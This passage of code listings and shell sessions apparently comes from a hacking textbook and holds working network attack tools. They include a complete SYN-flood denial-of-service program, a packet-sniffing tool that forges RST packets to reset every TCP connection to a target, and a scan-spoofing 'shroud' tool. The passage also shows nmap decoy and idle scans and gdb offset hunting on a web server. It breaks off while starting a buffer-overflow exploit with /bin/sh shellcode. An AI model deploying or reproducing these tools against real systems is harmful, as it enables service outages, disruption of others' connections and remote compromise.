tpa)\n{\n    char ebuf[128];\n    u_char pkt[60];\n\n    if (sha == NULL &&\n        (sha = (u_char *)libnet_get_hwaddr(llif, dev, ebuf)) == NULL) {\n        return (-1);\n    }\n    if (spa == 0) {\n        if ((spa = libnet_get_ipaddr(llif, dev, ebuf)) == 0)\n            return (-1);\n        spa = htonl(spa); /* XXX */\n    }\n    if (tha == NULL)\n        tha = \"\\xff\\xff\\xff\\xff\\xff\\xff\";\n\n    `libnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, pkt);      libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, ETHER_ADDR_LEN, 4,              op, sha, (u_char *)&spa, tha, (u_char *)&tpa,              NULL, 0, pkt + ETH_H);`\n\n    fprintf(stderr, \"%s \",\n        ether_ntoa((struct ether_addr *)sha));\n\n    if (op == ARPOP_REQUEST) {\n        fprintf(stderr, \"%s 0806 42: arp who-has %s tell %s\\n\",\n            ether_ntoa((struct ether_addr *)tha),\n            libnet_host_lookup(tpa, 0),\n            libnet_host_lookup(spa, 0));\n    }\n    else {\n        fprintf(stderr, \"%s 0806 42: arp reply %s is-at \",\n            ether_ntoa((struct ether_addr *)tha),\n            libnet_host_lookup(spa, 0));\n        fprintf(stderr, \"%s\\n\",\n            ether_ntoa((struct ether_addr *)sha));\n    }\n    return (`libnet_write_link_layer(llif, dev, pkt, sizeof(pkt)) == sizeof(pkt));`\n}\n```", "```\n`libnet_get_hwaddr()` takes a pointer to a link layer interface struct, a\npointer to the network device name, and an empty buffer to be used in case of\nerror. The function returns the MAC address of the specified interface upon\nsuccess or 0 upon error (and errbuf will contain a reason).\n\n`libnet_get_ipaddr()` takes a pointer to a link layer interface struct, a\npointer to the network device name, and an empty buffer to be used in case of\nerror. Upon success the function returns the IP address of the specified\ninterface in host-byte order or 0 upon error (and errbuf will contain a\nreason).\n\n`libnet_host_lookup()` converts the supplied network-ordered (big-endian) IPv4\naddress into its human-readable counterpart. If use_name is 1,\nlibnet_host_lookup() will attempt to resolve this IP address and return a\nhostname, otherwise (or if the lookup fails), the function returns a dotted-\ndecimal ASCII string.\n```", "```\n#include <libnet.h>\n\n#define FLOOD_DELAY 5000 // Delay between packet injects by 5000 ms.\n\n/* Returns an IP in x.x.x.x notation */\nchar *print_ip(u_long *ip_addr_ptr) {\n   return inet_ntoa( *((struct in_addr *)ip_addr_ptr) );\n}\n\nint main(int argc, char *argv[]) {\n   u_long dest_ip;\n   u_short dest_port;\n   u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;\n   int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;\n\n   if(argc < 3)\n   {\n      printf(\"Usage:\\n%s\\t <target host> <target port>\\n\", argv[0]);\n      exit(1);\n   }\n\n   dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // The host\n   dest_port = (u_short) atoi(argv[2]); // The port\n\n   network = libnet_open_raw_sock(IPPROTO_RAW); // Open network interface. \n   if (network == -1)\n      libnet_error(LIBNET_ERR_FATAL, \"can't open network interface.  -- this program\n must run\nas root.\\n\");\n   libnet_init_packet(packet_size, &packet); // Allocate memory for packet. \n   if (packet == NULL)\n      libnet_error(LIBNET_ERR_FATAL, \"can't initialize packet memory.\\n\");\n\n   libnet_seed_prand(); // Seed the random number generator.\n\n   printf(\"SYN Flooding port %d of %s..\\n\", dest_port, print_ip(&dest_ip));\n   while(1) // loop forever (until break by CTRL-C)\n   {\n      libnet_build_ip(LIBNET_TCP_H,      // Size of the packet sans IP header.\n         IPTOS_LOWDELAY,                 // IP tos\n         libnet_get_prand(LIBNET_PRu16), // IP ID (randomized)\n         0,                              // Frag stuff\n         libnet_get_prand(LIBNET_PR8),   // TTL (randomized)\n         IPPROTO_TCP,                    // Transport protocol\n         libnet_get_prand(LIBNET_PRu32), // Source IP (randomized)\n         dest_ip,                        // Destination IP\n         NULL,                           // Payload (none)\n         0,                              // Payload length\n         packet);                        // Packet header memory\n\n      libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP port (random)\n         dest_port,                      // Destination TCP port\n         libnet_get_prand(LIBNET_PRu32), // Sequence number (randomized)\n         libnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)\n         TH_SYN,                         // Control flags (SYN flag set only)\n         libnet_get_prand(LIBNET_PRu16), // Window size (randomized)\n         0,                              // Urgent pointer\n         NULL,                           // Payload (none)\n         0,                              // Payload length\n         packet + LIBNET_IP_H);          // Packet header memory\n\n      if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)\n         libnet_error(LIBNET_ERR_FATAL, \"can't compute checksum\\n\");\n\n      byte_count = libnet_write_ip(network, packet, packet_size); // Inject packet.\n      if (byte_count < packet_size)\n         libnet_error(LIBNET_ERR_WARNING, \"Warning: Incomplete packet written.  (%d of %d\nbytes)\", byte_count, packet_size);\n\n      usleep(FLOOD_DELAY); // Wait for FLOOD_DELAY milliseconds.\n   }\n\n   libnet_destroy_packet(&packet); // Free packet memory.\n\n   if (libnet_close_raw_sock(network) == -1) // Close the network interface.\n\n      libnet_error(LIBNET_ERR_WARNING, \"can't close network interface.\");\n\n   return 0;\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o synflood synflood.c -lnet\nIn file included from synflood.c:1:\n/usr/include/libnet.h:87:2: #error \"byte order has not been specified, you'll\"\nsynflood.c:6: error: syntax error before string constant\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ libnet-config --help\nUsage: libnet-config [OPTIONS]\nOptions:\n        [--libs]\n        [--cflags]\n        [--defines]\nreader@hacking:~/booksrc $ libnet-config --defines\n-D_BSD_SOURCE -D__BSD_SOURCE -D__FAVOR_BSD -DHAVE_NET_ETHERNET_H\n-DLIBNET_LIL_ENDIAN\n```", "```\nreader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o synflood\nsynflood.c -lnet\nreader@hacking:~/booksrc $ ./synflood\nUsage:\n./synflood       <target host> <target port>\nreader@hacking:~/booksrc $ \nreader@hacking:~/booksrc $ ./synflood 192.168.42.88 22\nFatal: can't open network interface.  -- this program must run as root.\nreader@hacking:~/booksrc $ sudo ./synflood 192.168.42.88 22 \nSYN Flooding port 22 of 192.168.42.88..\n```", "```\nreader@hacking:~/booksrc $ sudo tcpdump -i eth0 -nl -c 15 \"host 192.168.42.88\"\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes\n17:08:16.334498 IP 121.213.150.59.4584 > 192.168.42.88.22: S\n751659999:751659999(0) win 14609\n17:08:16.346907 IP 158.78.184.110.40565 > 192.168.42.88.22: S\n139725579:139725579(0) win 64357\n17:08:16.358491 IP 53.245.19.50.36638 > 192.168.42.88.22: S\n322318966:322318966(0) win 43747\n17:08:16.370492 IP 91.109.238.11.4814 > 192.168.42.88.22: S\n685911671:685911671(0) win 62957\n17:08:16.382492 IP 52.132.214.97.45099 > 192.168.42.88.22: S\n71363071:71363071(0) win 30490\n17:08:16.394909 IP 120.112.199.34.19452 > 192.168.42.88.22: S\n1420507902:1420507902(0) win 53397\n17:08:16.406491 IP 60.9.221.120.21573 > 192.168.42.88.22: S\n2144342837:2144342837(0) win 10594\n17:08:16.418494 IP 137.101.201.0.54665 > 192.168.42.88.22: S\n1185734766:1185734766(0) win 57243\n17:08:16.430497 IP 188.5.248.61.8409 > 192.168.42.88.22: S\n1825734966:1825734966(0) win 43454\n17:08:16.442911 IP 44.71.67.65.60484 > 192.168.42.88.22: S\n1042470133:1042470133(0) win 7087\n17:08:16.454489 IP 218.66.249.126.27982 > 192.168.42.88.22: S\n1767717206:1767717206(0) win 50156\n17:08:16.466493 IP 131.238.172.7.15390 > 192.168.42.88.22: S\n2127701542:2127701542(0) win 23682\n17:08:16.478497 IP 130.246.104.88.48221 > 192.168.42.88.22: S\n2069757602:2069757602(0) win 4767\n17:08:16.490908 IP 140.187.48.68.9179 > 192.168.42.88.22: S\n1429854465:1429854465(0) win 2092\n17:08:16.502498 IP 33.172.101.123.44358 > 192.168.42.88.22: S\n1524034954:1524034954(0) win 26970\n15 packets captured\n30 packets received by filter\n0 packets dropped by kernel\nreader@hacking:~/booksrc $ ssh -v 192.168.42.88\nOpenSSH_4.3p2, OpenSSL 0.9.8c 05 Sep 2006\ndebug1: Reading configuration data /etc/ssh/ssh_config\ndebug1: Connecting to 192.168.42.88 [192.168.42.88] port 22.\ndebug1: connect to address 192.168.42.88 port 22: Connection refused\nssh: connect to host 192.168.42.88 port 22: Connection refused\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ sudo tcpdump -d \"dst host 192.168.42.88\"\n(000) ldh      [12]\n(001) jeq      #0x800          jt 2    jf 4\n(002) ld       [30]\n(003) jeq      #0xc0a82a58     jt 8    jf 9\n(004) jeq      #0x806          jt 6    jf 5\n(005) jeq      #0x8035         jt 6    jf 9\n(006) ld       [38]\n(007) jeq      #0xc0a82a58     jt 8    jf 9\n(008) ret      #96\n(009) ret      #0\nreader@hacking:~/booksrc $ sudo tcpdump -ddd \"dst host 192.168.42.88\"\n10\n40 0 0 12\n21 0 2 2048\n32 0 0 30\n21 4 5 3232246360\n21 1 0 2054\n21 0 3 32821\n32 0 0 38\n21 0 1 3232246360\n6 0 0 96\n6 0 0 0 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ sudo tcpdump -nl \"tcp[tcpflags] & tcp-ack != 0 and dst host \n192.168.42.88\"\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes\n10:19:47.567378 IP 192.168.42.72.40238 > 192.168.42.88.22: . ack 2777534975 win 92 \n<nop,nop,timestamp 85838571 0>\n10:19:47.770276 IP 192.168.42.72.40238 > 192.168.42.88.22: . ack 22 win 92 <nop,nop,\ntimestamp\n85838621 29399>\n10:19:47.770322 IP 192.168.42.72.40238 > 192.168.42.88.22: P 0:20(20) ack 22 win 92 \n<nop,nop,timestamp 85838621 29399>\n10:19:47.771536 IP 192.168.42.72.40238 > 192.168.42.88.22: P 20:732(712) ack 766 win 115 \n<nop,nop,timestamp 85838622 29399>\n10:19:47.918866 IP 192.168.42.72.40238 > 192.168.42.88.22: P 732:756(24) ack 766 win 115  \n<nop,nop,timestamp 85838659 29402>\n```", "```\n#include <libnet.h>\n#include <pcap.h>\n#include \"hacking.h\"\n\nvoid caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);\nint set_packet_filter(pcap_t *, struct in_addr *);\n\nstruct data_pass {\n   int libnet_handle;\n   u_char *packet;\n}; \n\nint main(int argc, char *argv[]) {\n   struct pcap_pkthdr cap_header;\n   const u_char *packet, *pkt_data;\n   pcap_t *pcap_handle;\n   char errbuf[PCAP_ERRBUF_SIZE]; // Same size as LIBNET_ERRBUF_SIZE\n   char *device;\n   u_long target_ip;\n   int network;\n   struct data_pass critical_libnet_data;\n\n   if(argc < 1) {\n      printf(\"Usage: %s <target IP>\\n\", argv[0]);\n      exit(0);\n   }\n   target_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);\n\n   if (target_ip == -1)\n      fatal(\"Invalid target address\");\n\n   device = pcap_lookupdev(errbuf);\n   if(device == NULL)\n      fatal(errbuf);\n\n   pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);\n   if(pcap_handle == NULL)\n      fatal(errbuf);\n\n   critical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);\n   if(critical_libnet_data.libnet_handle == -1)\n      libnet_error(LIBNET_ERR_FATAL, \"can't open network interface.  -- this program must\n run\n\nas root.\\n\");\n\n   libnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));\n   if (critical_libnet_data.packet == NULL)\n      libnet_error(LIBNET_ERR_FATAL, \"can't initialize packet memory.\\n\");\n\n   libnet_seed_prand();\n\n   set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);\n\n   printf(\"Resetting all TCP connections to %s on %s\\n\", argv[1], device);\n   pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);\n\n   pcap_close(pcap_handle); \n}\n```", "```\n/* Sets a packet filter to look for established TCP connections to target_ip */\nint set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip) {\n   struct bpf_program filter;\n   char filter_string[100];\n\n   sprintf(filter_string, \"tcp[tcpflags] & tcp-ack != 0 and dst host %s\", \ninet_ntoa(*target_ip));\n\n   printf(\"DEBUG: filter string is \\'%s\\'\\n\", filter_string);\n   if(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)\n      fatal(\"pcap_compile failed\");\n\n   if(pcap_setfilter(pcap_hdl, &filter) == -1)\n      fatal(\"pcap_setfilter failed\"); \n}\n```", "```\nvoid caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char \n*packet) {\n   u_char *pkt_data;\n   struct libnet_ip_hdr *IPhdr;\n   struct libnet_tcp_hdr *TCPhdr;\n   struct data_pass *passed;\n   int bcount;\n\n   passed = (struct data_pass *) user_args; // Pass data using a pointer to a struct.\n\n   IPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);\n   TCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);\n\n   printf(\"resetting TCP connection from %s:%d \",\n         inet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));\n   printf(\"<---> %s:%d\\n\",\n         inet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));\n   libnet_build_ip(LIBNET_TCP_H,      // Size of the packet sans IP header\n      IPTOS_LOWDELAY,                 // IP tos\n      libnet_get_prand(LIBNET_PRu16), // IP ID (randomized)\n      0,                              // Frag stuff\n      libnet_get_prand(LIBNET_PR8),   // TTL (randomized)\n      IPPROTO_TCP,                    // Transport protocol\n      *((u_long *)&(IPhdr->ip_dst)),  // Source IP (pretend we are dst)\n      *((u_long *)&(IPhdr->ip_src)),  // Destination IP (send back to src)\n      NULL,                           // Payload (none)\n      0,                              // Payload length\n      passed->packet);                // Packet header memory \n\n   libnet_build_tcp(htons(TCPhdr->th_dport), // Source TCP port (pretend we are dst)\n      htons(TCPhdr->th_sport),        // Destination TCP port (send back to src)\n      htonl(TCPhdr->th_ack),          // Sequence number (use previous ack)\n      libnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)\n      TH_RST,                         // Control flags (RST flag set only)\n      libnet_get_prand(LIBNET_PRu16), // Window size (randomized)\n      0,                              // Urgent pointer\n      NULL,                           // Payload (none)\n      0,                              // Payload length\n      (passed->packet) + LIBNET_IP_H);// Packet header memory\n\n   if (libnet_do_checksum(passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)\n      libnet_error(LIBNET_ERR_FATAL, \"can't compute checksum\\n\");\n\n   bcount = libnet_write_ip(passed->libnet_handle, passed->packet, \nLIBNET_IP_H+LIBNET_TCP_H);\n   if (bcount < LIBNET_IP_H + LIBNET_TCP_H)\n      libnet_error(LIBNET_ERR_WARNING, \"Warning: Incomplete packet written.\");\n\n   usleep(5000); // pause slightly\n}\n```", "```\nreader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o rst_hijack rst_hijack.c -lnet\n -lpcap\n\nreader@hacking:~/booksrc $ sudo ./rst_hijack 192.168.42.88\nDEBUG: filter string is 'tcp[tcpflags] & tcp-ack != 0 and dst host 192.168.42.88'\nResetting all TCP connections to 192.168.42.88 on eth0\nresetting TCP connection from 192.168.42.72:47783 <---> 192.168.42.88:22\n```", "```\nreader@hacking:~/booksrc $ sudo nmap -sS 192.168.42.72\n\nStarting Nmap 4.20 ( http://insecure.org ) at 2007-05-29 09:19 PDT\nInteresting ports on 192.168.42.72:\nNot shown: 1696 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh \n\nNmap finished: 1 IP address (1 host up) scanned in 0.094 seconds\n```", "```\nreader@hacking:~/booksrc $ sudo nmap -D 192.168.42.10,192.168.42.11 192.168.42.72\n```", "```\nreader@hacking:~/booksrc $ sudo nmap -sI idlehost.com 192.168.42.7\n```", "```\nreader@hacking:~/booksrc $ grep -n -A 20 \"void.*send_reset\" /usr/src/linux/net/ipv4/\ntcp_ipv4.c\n547:static void tcp_v4_send_reset(struct sock *sk, struct sk_buff *skb)\n548-{\n549-    struct tcphdr *th = skb->h.th;\n550-    struct {\n551-            struct tcphdr th;\n552-#ifdef CONFIG_TCP_MD5SIG\n553-            __be32 opt[(TCPOLEN_MD5SIG_ALIGNED >> 2)];\n554-#endif\n555-    } rep;\n556-    struct ip_reply_arg arg;\n557-#ifdef CONFIG_TCP_MD5SIG\n558-    struct tcp_md5sig_key *key;\n559-#endif\n560-\n\n     `return; // Modification: Never send RST, always return.`\n\n561-    /* Never send a reset in response to a reset. */\n562-    if (th->rst)\n563-            return;\n564-\n565-    if (((struct rtable *)skb->dst)->rt_type != RTN_LOCAL)\n566-            return;\n567- \nreader@hacking:~/booksrc $\n```", "```\nmatrix@euclid:~ $ sudo nmap -T5 -sF 192.168.42.72\nStarting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2007-03-17 16:58 PDT\nInteresting ports on 192.168.42.72:\nNot shown: 1678 closed ports\n\nPORT   STATE         SERVICE\n22/tcp open|filtered ssh\n80/tcp open|filtered http\nMAC Address: 00:01:6C:EB:1D:50 (Foxconn)\nNmap finished: 1 IP address (1 host up) scanned in 1.462 seconds\nmatrix@euclid:~ $\n```", "```\nmatrix@euclid:~ $ sudo nmap -T5 -sF 192.168.42.72\nStarting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2007-03-17 16:58 PDT\nInteresting ports on 192.168.42.72:\nNot shown: 1678 closed ports\nPORT   STATE         SERVICE\nMAC Address: 00:01:6C:EB:1D:50 (Foxconn)\nNmap finished: 1 IP address (1 host up) scanned in 1.462 seconds\nmatrix@euclid:~ $\n```", "```\n#include <libnet.h>\n#include <pcap.h>\n#include \"hacking.h\"\n\n#define MAX_EXISTING_PORTS 30\n\nvoid caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);\nint set_packet_filter(pcap_t *, struct in_addr *, u_short *);\n\nstruct data_pass {\n   int libnet_handle; \n   u_char *packet;\n};\n\nint main(int argc, char *argv[]) {\n   struct pcap_pkthdr cap_header;\n   const u_char *packet, *pkt_data;\n   pcap_t *pcap_handle;\n   char errbuf[PCAP_ERRBUF_SIZE]; // Same size as LIBNET_ERRBUF_SIZE\n   char *device; \n   u_long target_ip; \n   int network, i;\n   struct data_pass critical_libnet_data;\n   u_short existing_ports[MAX_EXISTING_PORTS];\n\n   if((argc < 2) || (argc > MAX_EXISTING_PORTS+2)) {\n      if(argc > 2)\n         printf(\"Limited to tracking %d existing ports.\\n\", MAX_EXISTING_PORTS);\n      else\n         printf(\"Usage: %s <IP to shroud> [existing ports...]\\n\", argv[0]);\n      exit(0);\n   }\n\n   target_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);\n   if (target_ip == -1)\n      fatal(\"Invalid target address\");\n\n   for(i=2; i < argc; i++)\n      existing_ports[i-2] = (u_short) atoi(argv[i]);\n\n   existing_ports[argc-2] = 0;\n\n   device = pcap_lookupdev(errbuf);\n   if(device == NULL)\n      fatal(errbuf);\n\n   pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);\n   if(pcap_handle == NULL)\n      fatal(errbuf);\n\n   critical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);\n   if(critical_libnet_data.libnet_handle == -1)\n      libnet_error(LIBNET_ERR_FATAL, \"can't open network interface.  -- this program must run\nas root.\\n\");\n\n   libnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));\n   if (critical_libnet_data.packet == NULL)\n      libnet_error(LIBNET_ERR_FATAL, \"can't initialize packet memory.\\n\");\n\n   libnet_seed_prand();\n\n   set_packet_filter(pcap_handle, (struct in_addr *)&target_ip, existing_ports);\n\n   pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);\n   pcap_close(pcap_handle);\n}\n\n/* Sets a packet filter to look for established TCP connections to target_ip */\nint set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip, u_short *ports) {\n   struct bpf_program filter;\n   char *str_ptr, filter_string[90 + (25 * MAX_EXISTING_PORTS)];\n   int i=0;\n\n   sprintf(filter_string, \"dst host %s and \", inet_ntoa(*target_ip)); // Target IP\n   strcat(filter_string, \"tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0\");\n\n   if(ports[0] != 0) { // If there is at least one existing port\n      str_ptr = filter_string + strlen(filter_string);\n      if(ports[1] == 0) // There is only one existing port\n         sprintf(str_ptr, \" and not dst port %hu\", ports[i]);\n      else { // Two or more existing ports\n         sprintf(str_ptr, \" and not (dst port %hu\", ports[i++]);\n         while(ports[i] != 0) {\n            str_ptr = filter_string + strlen(filter_string);\n            sprintf(str_ptr, \" or dst port %hu\", ports[i++]);\n         }\n         strcat(filter_string, \")\");\n      }\n   }\n   printf(\"DEBUG: filter string is \\'%s\\'\\n\", filter_string);\n   if(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)\n      fatal(\"pcap_compile failed\");\n\n   if(pcap_setfilter(pcap_hdl, &filter) == -1)\n      fatal(\"pcap_setfilter failed\");\n}\n\nvoid caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char\n*packet) {\n   u_char *pkt_data;\n   struct libnet_ip_hdr *IPhdr;\n   struct libnet_tcp_hdr *TCPhdr;\n   struct data_pass *passed;\n   int bcount;\n\n   passed = (struct data_pass *) user_args; // Pass data using a pointer to a struct\n\n   IPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);\n   TCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);\n\n   libnet_build_ip(LIBNET_TCP_H,      // Size of the packet sans IP header \n      IPTOS_LOWDELAY,                 // IP tos \n      libnet_get_prand(LIBNET_PRu16), // IP ID (randomized) \n      0,                              // Frag stuff \n      libnet_get_prand(LIBNET_PR8),   // TTL (randomized) \n      IPPROTO_TCP,                    // Transport protocol \n      *((u_long *)&(IPhdr->ip_dst)),  // Source IP (pretend we are dst) \n      *((u_long *)&(IPhdr->ip_src)),  // Destination IP (send back to src) \n      NULL,                           // Payload (none) \n      0,                              // Payload length \n      passed->packet);                // Packet header memory \n\n   libnet_build_tcp(htons(TCPhdr->th_dport),// Source TCP port (pretend we are dst) \n      htons(TCPhdr->th_sport),        // Destination TCP port (send back to src) \n      htonl(TCPhdr->th_ack),          // Sequence number (use previous ack) \n      htonl((TCPhdr->th_seq) + 1),    // Acknowledgement number (SYN's seq # + 1)\n      TH_SYN | TH_ACK,                // Control flags (RST flag set only) \n      libnet_get_prand(LIBNET_PRu16), // Window size (randomized) \n      0,                              // Urgent pointer\n      NULL,                           // Payload (none)\n      0,                              // Payload length \n      (passed->packet) + LIBNET_IP_H);// Packet header memory \n\n   if (libnet_do_checksum(passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)\n      libnet_error(LIBNET_ERR_FATAL, \"can't compute checksum\\n\");\n\n   bcount = libnet_write_ip(passed->libnet_handle, passed->packet,\n LIBNET_IP_H+LIBNET_TCP_H);\n   if (bcount < LIBNET_IP_H + LIBNET_TCP_H)\n      libnet_error(LIBNET_ERR_WARNING, \"Warning: Incomplete packet written.\");\n   printf(\"bing!\\n\"); \n}\n```", "```\nreader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o shroud shroud.c -lnet -lpcap\nreader@hacking:~/booksrc $ sudo ./shroud 192.168.42.72 22 80\nDEBUG: filter string is 'dst host 192.168.42.72 and tcp[tcpflags] & tcp-syn != 0 and\ntcp[tcpflags] & tcp-ack = 0 and not (dst port 22 or dst port 80)'\n```", "```\nmatrix@euclid:~ $ sudo nmap -sS 192.168.0.189\n\nStarting nmap V. 3.00 ( www.insecure.org/nmap/ )\nInteresting ports on  (192.168.0.189):\nPort       State       Service\n1/tcp      open        tcpmux\n2/tcp      open        compressnet\n3/tcp      open        compressnet\n4/tcp      open        unknown\n5/tcp      open        rje\n6/tcp      open        unknown\n7/tcp      open        echo\n8/tcp      open        unknown\n9/tcp      open        discard\n10/tcp     open        unknown\n11/tcp     open        systat\n12/tcp     open        unknown\n13/tcp     open        daytime\n14/tcp     open        unknown\n15/tcp     open        netstat\n16/tcp     open        unknown\n17/tcp     open        qotd\n18/tcp     open        msp\n19/tcp     open        chargen\n20/tcp     open        ftp-data\n21/tcp     open        ftp\n`22/tcp     open        ssh`\n23/tcp     open        telnet\n24/tcp     open        priv-mail\n25/tcp     open        smtp\n\n[ output trimmed ]\n\n32780/tcp  open        sometimes-rpc23\n32786/tcp  open        sometimes-rpc25\n32787/tcp  open        sometimes-rpc27\n43188/tcp  open        reachout\n44442/tcp  open        coldfusion-auth\n44443/tcp  open        coldfusion-auth\n47557/tcp  open        dbbrowse\n49400/tcp  open        compaqdiag\n54320/tcp  open        bo2k\n61439/tcp  open        netprowler-manager\n61440/tcp  open        netprowler-manager2\n61441/tcp  open        netprowler-sensor\n65301/tcp  open        pcanywhere\n\nNmap run completed -- 1 IP address (1 host up) scanned in 37 seconds \nmatrix@euclid:~ $\n```", "```\n/* This function accepts a socket FD and a ptr to a destination\n * buffer.  It will receive from the socket until the EOL byte\n * sequence in seen.  The EOL bytes are read from the socket, but\n * the destination buffer is terminated before these bytes.\n * Returns the size of the read line (without EOL bytes).\n */\nint recv_line(int sockfd, unsigned char *dest_buffer) {\n#define EOL \"\\r\\n\" // End-of-line byte sequence\n#define EOL_SIZE 2\n   unsigned char *ptr;\n   int eol_matched = 0;\n\n   ptr = dest_buffer;\n\n   while(recv(sockfd, ptr, 1, 0) == 1) { // Read a single byte.\n      if(*ptr == EOL[eol_matched]) { // Does this byte match terminator?\n         eol_matched++;\n         if(eol_matched == EOL_SIZE) { // If all bytes match terminator,\n            *(ptr+1-EOL_SIZE) = '\\0'; // terminate the string.\n            return strlen(dest_buffer); // Return bytes recevied.\n         }\n      } else {\n         eol_matched = 0;\n      }\n      ptr++; // Increment the pointer to the next byte.\n   }\n   return 0; // Didn't find the end-of-line characters. \n}\n```", "```\nreader@hacking:~/booksrc $ ps aux | grep tinyweb\nroot     13019  0.0  0.0   1504   344 pts/0    S+   20:25   0:00 ./tinyweb\nreader   13104  0.0  0.0   2880   748 pts/2    R+   20:27   0:00 grep tinyweb\nreader@hacking:~/booksrc $ gcc -g tinyweb.c \nreader@hacking:~/booksrc $ sudo gdb -q --pid=13019 --symbols=./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nAttaching to process 13019\n/cow/home/reader/booksrc/tinyweb: No such file or directory.\nA program is being debugged already.  Kill it? (y or n) n\nProgram not killed.\n(gdb) bt\n#0  0xb7fe77f2 in ?? ()\n#1  0xb7f691e1 in ?? ()\n#2  0x08048ccf in main () at tinyweb.c:44\n(gdb) list 44\n39         if (listen(sockfd, 20) == -1)\n40            fatal(\"listening on socket\");\n41\n42         while(1) {   // Accept loop\n43            sin_size = size of(struct sockaddr_in);\n44            `new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);`\n45            if(new_sockfd == -1)\n46               fatal(\"accepting connection\");\n47\n48            handle_connection(new_sockfd, &client_addr);\n(gdb) list handle_connection\n53      /* This function handles the connection on the passed socket from the\n54       * passed client address.  The connection is processed as a web request\n55       * and this function replies over the connected socket.  Finally, the \n56       * passed socket is closed at the end of the function.\n57       */\n58      void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {\n59         unsigned char *ptr, request[500], resource[500];\n60         int fd, length;\n61\n62         length = recv_line(sockfd, request);\n(gdb) break 62\nBreakpoint 1 at 0x8048d02: file tinyweb.c, line 62.\n(gdb) cont \nContinuing. \n```", "```\nBreakpoint 2, handle_connection (sockfd=4, client_addr_ptr=0xbffff810) at tinyweb.c:62\n62         length = recv_line(sockfd, request);\n(gdb) x/x request \n0xbffff5c0:     0x00000000\n(gdb) bt\n#0  handle_connection (sockfd=4, client_addr_ptr=0xbffff810) at tinyweb.c:62\n#1  0x08048cf6 in main () at tinyweb.c:48\n(gdb) x/16xw request+500\n0xbffff7b4:     0xb7fd5ff4      0xb8000ce0      0x00000000      0xbffff848\n0xbffff7c4:     0xb7ff9300      0xb7fd5ff4      0xbffff7e0      0xb7f691c0\n0xbffff7d4:     0xb7fd5ff4      0xbffff848      0x08048cf6      0x00000004\n0xbffff7e4:     0xbffff810      0xbffff80c      0xbffff834      0x00000004\n(gdb) x/x 0xbffff7d4+8\n0xbffff7dc:     0x08048cf6\n(gdb) p 0xbffff7dc - 0xbffff5c0\n$1 = 540\n(gdb) p /x 0xbffff5c0 + 200\n$2 = 0xbffff688\n(gdb) quit\nThe program is running.  Quit anyway (and detach it)? (y or n) y\nDetaching from program: , process 13019 \nreader@hacking:~/booksrc $ \n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n\n#include \"hacking.h\"\n#include \"hacking-network.h\"\n\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\";  // Standard shellcode\n\n#define OFFSET 540\n#define RETADDR 0xbffff688\n\nint main(int argc, char *argv[]) {\n  